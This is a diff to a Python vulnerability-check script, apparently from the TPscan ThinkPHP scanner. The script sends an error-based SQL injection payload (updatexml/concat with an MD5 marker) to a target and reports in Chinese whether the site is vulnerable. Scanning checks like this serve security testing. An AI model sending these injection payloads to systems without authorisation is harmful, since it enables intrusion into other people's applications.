@@ -3,20 +3,24 @@
 import urllib
 import requests
 import urllib3
+
 urllib3.disable_warnings()
+from termcolor import colored
+
 
 def thinkphp_debug_index_ids_sqli_verify(url):
+    """thinkphp_debug_index_ids_sqli_verify"""
     pocdict = {
-        "vulnname":"thinkphp_debug_index_ids_sqli",
+        "vulnname": "thinkphp_debug_index_ids_sqli",
         "isvul": False,
-        "vulnurl":"",
-        "payload":"",
-        "proof":"",
-        "response":"",
-        "exception":"",
+        "vulnurl": "",
+        "payload": "",
+        "proof": "",
+        "response": "",
+        "exception": "",
     }
     headers = {
-        "User-Agent" : "TPscan",
+        "User-Agent": "TPscan",
     }
     payload = 'index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1'
     try:
@@ -26,8 +30,11 @@ def thinkphp_debug_index_ids_sqli_verify(url):
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
             pocdict['proof'] = '56540676a129760'
-            pocdict['response'] = req.text
-            print(pocdict)
-
+            pocdict['response'] = req.status_code
+            print(colored("[+] 目标存在 thinkphp_debug_index_ids_sqli 漏洞\tpayload: ", "green"))
+            print(colored(pocdict, 'green'))
+        else:
+            print(colored("\n[*] 目标不存在 thinkphp_debug_index_ids_sqli 漏洞", "red"))
     except:
+        print(colored("\n[*] 目标不存在 thinkphp_debug_index_ids_sqli 漏洞", "red"))
         pass
